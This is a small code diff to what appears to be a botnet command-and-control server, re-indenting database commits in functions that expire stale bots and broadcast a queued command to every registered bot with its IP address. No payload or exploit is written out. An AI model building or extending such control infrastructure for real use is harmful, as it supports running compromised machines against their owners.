@@ -460,7 +460,7 @@ def refresh():
         for bot in botlist:
             if (datetime.now() - bot.timestamp).total_seconds() > TIMER*3:
                 db.session.delete(bot)
-        db.session.commit()
+                db.session.commit()
     except Exception as e:
         pass 
 
@@ -549,7 +549,7 @@ def broadcast():
             cmd = Command(command, bot.id, bot.ip)
             bot.cmds.append(cmd)
             db.session.add(cmd)
-        db.session.commit()
+            db.session.commit()
 
     except Exception as e:
         return jsonify({ 'error': str(e) })
